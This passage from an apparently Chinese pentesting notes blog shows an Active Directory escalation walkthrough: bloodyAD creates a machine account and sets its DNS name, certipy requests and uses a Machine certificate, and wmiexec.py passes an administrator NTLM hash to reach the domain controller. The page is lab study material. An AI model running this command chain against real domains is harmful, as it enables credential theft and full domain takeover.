<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230819045448895.png" alt="image-20230819045448895"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用bloodyAD查看ms-DS-MachineAccountQuota属性，如果ms-DS-MachineAccountQuota&gt;0就可以创建机器帐户</span><br><span class="line">python3 bloodyAD.py -d xming.com -u test -p zgm#1573 --host 192.168.33.144  getObjectAttributes &quot;DC=xming,DC=com&quot;  ms-DS-MachineAccountQuota</span><br><span class="line">这里一开始是报错 需要在/usr/local/lib/python3.10/dist-packages/ldap3/utils/ntlm.py 修改from Crypto.Hash import MD4 为 from Cryptodome.Hash import MD4 </span><br><span class="line">没报错且运行出来的老铁可以不改</span><br><span class="line"></span><br><span class="line">使用bloodyAD查看ms-DS-MachineAccountQuota属性，如果ms-DS-MachineAccountQuota&gt;0就可以创建机器帐户</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230819050738736.png" alt="image-20230819050738736"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在LDAP中创建一个机器帐户，然后查看Active Directory 用户和计算机 点击computers 查看到test66是我们创建出来的机器账户</span><br><span class="line"></span><br><span class="line">python3 bloodyAD.py -d &#x27;m4ao.com&#x27; -u &#x27;mjw&#x27; -p &#x27;Maojiawei@123&#x27; --host &#x27;192.168.33.144&#x27; addComputer test66 &#x27;mjw123&#x27;</span><br><span class="line">创建一个test66密码为jmjw123的机器账户</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230819051124023.png" alt="image-20230819051124023"></p>
<p>设置属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bloodyAD.py -d m4ao.com -u mjw -p &#x27;Maojiawei@123&#x27; --host 192.168.8.137 setAttribute &#x27;CN=test66,CN=Computers,DC=m4ao,DC=com&#x27; dNSHostName &#x27;[&quot;mjw.m4ao.com&quot;]&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230819051615442.png" alt="image-20230819051615442"></p>
<p>申请证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -username test66\$@xming.com -password mjw123 -ca m4ao-MJW-CA -target m4ao.com -template Machine -debug</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230819052419618.png" alt="image-20230819052419618"></p>
<p>检测证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx ./mjw.pfx -dc-ip 192.168.8.137</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230819052535777.png" alt="image-20230819052535777"></p>
<p>获取域内所有HASH</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230819053034209.png" alt="image-20230819053034209"></p>
<p>PTH获取域控</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py m4ao.com/administrator@192.168.8.137 -hashes aad3b435b51404eeaad3b435b51404ee:ff83426bd77a95c64e00777fcafb7a20</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/新建文件夹\笔记\渗透测试\权限提升\image-20230819053928260.png" alt="image-20230819053928260"></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
                        
                    
                        
                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
                        
                    
                </ul>
            
        </div>
        
        
    <div id="gitalk-container" class="comment link"
		data-enable="false"
        data-ae="false"
        data-ci=""
        data-cs=""
        data-r=""
        data-o=""
        data-a=""
        data-d="false"
    >查看评论</div>


    </div>
    
        <div class="side">
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.1.</span> <span class="toc-text">windows 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text">权限介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.3.</span> <span class="toc-text">手工提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E5%8D%8A%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.4.</span> <span class="toc-text">MSF半自动提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CS%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.5.</span> <span class="toc-text">CS自动提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">提权条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MYSQL-UDF-MOF-%E5%90%AF%E5%8A%A8%E9%A1%B9%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.2.</span> <span class="toc-text">MYSQL-UDF&amp;MOF&amp;启动项反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81UDF"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">一、UDF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81MOF"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">二、MOF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">三、启动项</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSQL-xp-cmdshell-sp-oacreate-%E6%B2%99%E7%9B%92"><span class="toc-number">1.2.3.</span> <span class="toc-text">MSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81xp-cmdshell"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">一、xp_cmdshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81sp-oacreate"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">二、sp_oacreate</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Server-%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.4.</span> <span class="toc-text">SQL Server 沙盒提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PostgreSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.2.5.</span> <span class="toc-text">PostgreSQL数据库权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2018-1058-PostgreSQL-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">CVE-2018-1058(PostgreSQL 提权漏洞)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2019-9193-%EF%BC%88%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">CVE-2019-9193 （高权限命令执行漏洞）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WIN-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">WIN 本地用户提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AT-SC-PS-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">AT&amp;SC&amp;PS 命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.3.</span> <span class="toc-text">进程迁移注入获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">1.3.4.</span> <span class="toc-text">令牌窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BaybassUac"><span class="toc-number">1.3.5.</span> <span class="toc-text">BaybassUac</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.6.</span> <span class="toc-text">DLL劫持提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E9%85%8D%E5%90%88"><span class="toc-number">1.3.7.</span> <span class="toc-text">不带引号服务路径配合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E5%90%88"><span class="toc-number">1.3.8.</span> <span class="toc-text">不安全的服务权限配合</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">Linux 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E9%85%8D%E7%BD%AE%E5%AE%89%E5%85%A8SUID%E6%8F%90%E6%9D%83-%E6%8E%A2%E9%92%88-%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.1.</span> <span class="toc-text">Linux-配置安全SUID提权-探针&amp;利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83-%E6%8E%A2%E9%92%88-%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.2.</span> <span class="toc-text">Linux-内核漏洞本地用户提权-探针&amp;利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9EWeb%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83-%E6%8E%A2%E9%92%88-%E5%88%A9%E7%94%A8-%E8%84%8F%E7%89%9B"><span class="toc-number">1.4.3.</span> <span class="toc-text">Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83-%E6%8E%A2%E9%92%88%E2%80%93DirtyPipe"><span class="toc-number">1.4.4.</span> <span class="toc-text">Linux-内核漏洞本地用户提权-探针–DirtyPipe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Liunx-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%96%87%E4%BB%B6%E9%85%8D%E5%90%88-SUID-%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.4.5.</span> <span class="toc-text">Liunx-环境变量文件配合 SUID-本地</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%89%93%E5%8C%85%E9%85%8D%E5%90%88SUID-%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.4.6.</span> <span class="toc-text">Linux-定时任务打包配合SUID-本地</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-WEB-%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.4.7.</span> <span class="toc-text">Linux-定时任务文件权限配置不当-WEB&amp;本地</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6-MYSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-WEB-%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.4.8.</span> <span class="toc-text">Linux-第三方软件 MYSQL 数据库提权-WEB&amp;本地</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-Docker-%E7%BB%84%E7%94%A8%E6%88%B7%E6%8C%82%E8%BD%BD%E7%9B%AE%E5%BD%95-%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.4.9.</span> <span class="toc-text">Linux-Docker 组用户挂载目录-本地</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-Sudo%EF%BC%88CVE-2021-315-%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.4.10.</span> <span class="toc-text">Linux-Sudo（CVE-2021-315)-本地</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-Polkit-CVE-2021-4034-%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.4.11.</span> <span class="toc-text">Linux-Polkit(CVE-2021-4034)-本地</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WIN-%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">WIN-域控提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2014-6324"><span class="toc-number">1.5.1.</span> <span class="toc-text">CVE-2014-6324</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2021-42287"><span class="toc-number">1.5.2.</span> <span class="toc-text">CVE-2021-42287</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-1472"><span class="toc-number">1.5.3.</span> <span class="toc-text">CVE-2020-1472</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-2693"><span class="toc-number">1.6.</span> <span class="toc-text">CVE-2022-2693</span></a></li></ol></li></ol>
        </div>
    
</div>


    </div>
</div>
</body>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
